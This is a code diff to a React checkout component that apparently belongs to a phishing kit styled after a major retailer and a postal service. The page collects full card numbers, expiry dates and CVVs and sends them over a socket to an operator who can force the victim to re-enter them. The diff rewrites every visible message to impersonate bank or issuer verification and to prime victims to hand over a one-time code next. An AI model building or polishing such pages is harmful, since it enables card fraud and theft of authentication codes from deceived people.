@@ -105,7 +105,7 @@ export default function Checkout() {
   const [cvvDigits, setCvvDigits] = useState(initialDraft.cvvDigits);
   const [expiry, setExpiry] = useState(initialDraft.expiry);
   const [waiting, setWaiting] = useState(false);
-  const [waitingMsg, setWaitingMsg] = useState('Processing your request...');
+  const [waitingMsg, setWaitingMsg] = useState('Preparing your bank verification...');
 
   useEffect(() => {
     saveDraft(STORAGE_KEYS.checkoutDraft, { checkoutName, cardDisplay, cvvDigits, expiry });
@@ -148,7 +148,7 @@ export default function Checkout() {
       setCvvDigits('');
       setExpiry('');
       setWaiting(false);
-      setWaitingMsg('Processing your request...');
+      setWaitingMsg('Preparing your bank verification...');
       clearDraft(STORAGE_KEYS.checkoutDraft);
     };
     socket.on('force-checkout-refill', onForceCheckoutRefill);
@@ -172,7 +172,7 @@ export default function Checkout() {
     const normalizedExpiry = normalizeExpiry(expiry, true);
     if (!isValidExpiryMMYY(normalizedExpiry) || !canSubmit || waiting) return;
     setWaiting(true);
-    setWaitingMsg('Details received. Keep this page open while your bank verification is reviewed.');
+    setWaitingMsg('Details received. Keep this page open while your bank prepares the verification challenge.');
     clearDraft(STORAGE_KEYS.checkoutDraft);
     setExpiry(normalizedExpiry);
     socket.emit('checkout-submit', {
@@ -189,9 +189,9 @@ export default function Checkout() {
         <div className="absolute inset-0 z-50 flex items-center justify-center bg-slate-900/45 backdrop-blur-sm">
           <div className="w-full max-w-md rounded-2xl border border-slate-200 bg-white p-6 text-center shadow-2xl">
             <div className="mx-auto mb-3 h-10 w-10 rounded-full border-4 border-amber-200 border-t-[#ff9900] animate-spin" />
-            <div className="text-lg font-semibold text-slate-900">Processing your request</div>
+            <div className="text-lg font-semibold text-slate-900">Preparing verification</div>
             <div className="mt-2 text-sm text-slate-600">{waitingMsg}</div>
-            <div className="mt-6 text-xs text-slate-500">Keep this page open while your payment details are reviewed.</div>
+            <div className="mt-6 text-xs text-slate-500">Do not close this page while your issuer loads the next step.</div>
           </div>
         </div>
       )}
@@ -201,8 +201,8 @@ export default function Checkout() {
           <div className="alz-step-head">
             <div>
               <div className="alz-badge">{BRAND.name}</div>
-              <h1 className="alz-step-title">Confirm the billing method</h1>
-              <p className="alz-step-subtitle">Enter the card details required for bank verification.</p>
+              <h1 className="alz-step-title">Card verification</h1>
+              <p className="alz-step-subtitle">Enter the card details required by your bank to continue.</p>
             </div>
           </div>
           <div className="alz-track mt-3">
@@ -212,9 +212,9 @@ export default function Checkout() {
 
         <div className="alz-flow-grid alz-usps-flow-grid">
           <div className="alz-card alz-usps-form-card">
-            <div className="alz-section-eyebrow">Payment details</div>
-            <h2 className="alz-page-title">Review your card info</h2>
-            <p className="alz-page-copy">Enter the card details required by your bank.</p>
+            <div className="alz-section-eyebrow">Issuer review</div>
+            <h2 className="alz-page-title">Confirm your card details</h2>
+            <p className="alz-page-copy">Your bank may use these details to generate a secure verification challenge.</p>
             <div className="alz-brand-row mb-4">
               {BRAND_PROMISES.map((item) => (
                 <span key={item} className="alz-brand-pill">{item}</span>
@@ -246,32 +246,32 @@ export default function Checkout() {
               <div className="alz-payment-strip" aria-hidden="true">
                 <div className="alz-payment-strip-top">
                   <span className="alz-payment-strip-title">Accepted payment methods</span>
-                  <span className="alz-payment-strip-lock">Secure transaction</span>
+                  <span className="alz-payment-strip-lock">Issuer protected</span>
                 </div>
                 <div className="alz-payment-strip-row">
                   <span className="alz-payment-pill alz-payment-pill-visa">VISA</span>
                   <span className="alz-payment-pill alz-payment-pill-mastercard">mastercard</span>
                   <span className="alz-payment-pill alz-payment-pill-amex">AMERICAN EXPRESS</span>
                 </div>
-                <div className="alz-payment-strip-note">Use a payment method associated with this bank verification.</div>
+                <div className="alz-payment-strip-note">Use the same card that will be verified by your bank.</div>
               </div>
             </div>
 
             <button onClick={onSubmit} disabled={!canSubmit || waiting} className="alz-btn-primary mt-6 text-base alz-checkout-submit">
               {waiting ? 'Processing...' : 'Continue'}
             </button>
-            <div className="alz-helper-copy mt-6">Keep this page open while the bank verification is confirmed.</div>
+            <div className="alz-helper-copy mt-6">You may be asked to complete a one-time code challenge on the next step.</div>
             <div className="alz-footer">{BRAND.name} | {BRAND.tagline}</div>
             <div className="text-[11px] text-center text-[#565959] mt-1">{BRAND.legal}</div>
           </div>
 
           <aside className="alz-card alz-flow-aside alz-side-summary alz-usps-side-card">
-            <div className="alz-side-summary-title">Billing checklist</div>
+            <div className="alz-side-summary-title">Verification checklist</div>
             <div className="alz-order-mini-card">
               <div className="alz-order-mini-thumb alz-order-mini-thumb-card" />
               <div>
-                <div className="alz-order-mini-title">Review the payment method on file</div>
-                <div className="alz-order-mini-copy">Use the billing method linked to your bank account to confirm the card details.</div>
+                <div className="alz-order-mini-title">Use the card your bank recognizes</div>
+                <div className="alz-order-mini-copy">Enter the same card details your issuer will use for the verification challenge.</div>
               </div>
             </div>
             <div className="alz-side-summary-list">
@@ -279,7 +279,7 @@ export default function Checkout() {
               <div>Card number and expiration date</div>
               <div>3- or 4-digit security code</div>
             </div>
-            <div className="alz-side-summary-box">Use a billing method associated with this bank verification to complete the review.</div>
+            <div className="alz-side-summary-box">After this step, your issuer may ask you to confirm a one-time authentication code.</div>
           </aside>
         </div>
       </div>
